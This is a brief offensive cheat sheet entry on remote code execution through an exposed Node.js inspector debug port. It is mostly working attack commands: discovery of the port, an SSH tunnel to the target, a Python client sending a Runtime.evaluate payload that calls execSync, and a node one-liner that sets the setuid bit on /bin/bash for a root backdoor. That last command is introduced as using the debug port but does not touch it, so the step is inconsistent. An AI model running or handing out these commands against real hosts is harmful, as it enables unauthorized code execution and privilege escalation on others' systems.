# Node.js Inspector Debug Port RCE

A Node.js process started with `--inspect` or `--inspect-brk` exposes a Chrome DevTools Protocol (CDP) WebSocket on `127.0.0.1:9229`. Tunneling to it allows arbitrary code execution inside that process.

```bash
# Check for Node inspector (as a non-privileged user):
ps aux | grep -- '--inspect'
ss -tlnp | grep 9229

# Tunnel to localhost:9229 (if SSH access or socat available):
ssh -L 9229:127.0.0.1:9229 <user>@<TARGET>

# Execute code via Chrome DevTools Protocol:
curl -s http://127.0.0.1:9229/json  # list WebSocket debug targets
# Take the webSocketDebuggerUrl value

# Interact with CDP directly (Python):
python3 << 'EOF'
import websocket, json
ws = websocket.create_connection("ws://127.0.0.1:9229/<uuid>")
ws.send(json.dumps({"id":1,"method":"Runtime.evaluate","params":{"expression":"require('child_process').execSync('id').toString()"}}))
print(ws.recv())
EOF
```

From Node.js CLI directly (if `node` is available and target debug port is accessible):
```bash
node -e "process.binding('spawn_sync').spawn({file:'bash',args:['bash','-c','chmod +s /bin/bash'],stdio:[{type:'fd',fd:0},{type:'fd',fd:1},{type:'fd',fd:2}]})"
# Or: node --eval using the inspector attach method
```
